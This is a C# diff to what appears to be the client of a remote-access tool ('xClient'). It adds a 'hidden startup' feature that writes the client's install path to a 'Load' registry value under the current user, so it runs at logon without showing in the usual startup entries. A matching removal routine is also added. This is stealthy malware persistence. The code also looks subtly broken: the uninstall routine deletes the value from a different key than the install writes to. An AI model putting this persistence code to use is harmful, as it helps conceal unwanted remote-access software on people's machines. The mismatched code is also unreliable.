@@ -315,6 +315,44 @@ namespace xClient.Core
         {
             if (Settings.STARTUP)
             {
+				// Hidden startup as implemented by Rottweiler (https://support.microsoft.com/en-us/kb/103865)
+				if (Settings.HIDDENSTARTUP)
+				{
+					// Try writing to the key (fails if non-existant)
+					try
+					{
+						using (
+							RegistryKey key = 
+								Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows NT\\CurrentVersion"))
+						{
+							if (key == null) throw new Exception();
+							key.SetValue("Load", InstallPath);
+							key.Close();
+						}
+					}
+					catch
+					{
+						// Try creating the key
+						try
+						{
+							using (
+								RegistryKey key =
+									Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion"))
+							{
+								if (key == null) throw new Exception();
+								key.SetValue("Load", InstallPath);
+								key.Close();
+							}
+						}
+						catch
+						{
+							// Do nothing, installation failed
+						}
+					}
+
+                    return; // Avoid double installation due to below code (if HIDDENSTARTUP was selected in build)
+				}
+
                 if (AccountType == "Admin")
                 {
                     try // try LocalMachine
@@ -371,6 +409,30 @@ namespace xClient.Core
         {
             if (Settings.STARTUP)
             {
+                // Hidden startup as implemented by Rottweiler (https://support.microsoft.com/en-us/kb/103865)
+                if (Settings.HIDDENSTARTUP)
+                {
+                    try
+                    {
+                        using (
+                            RegistryKey key =
+                                Registry.CurrentUser.OpenWritableSubKeySafe(""))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue("Load", false);
+                                key.Close();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        // Do nothing, uninstallation failed
+                    }
+
+                    return;
+                }
+
                 if (AccountType == "Admin")
                 {
                     try
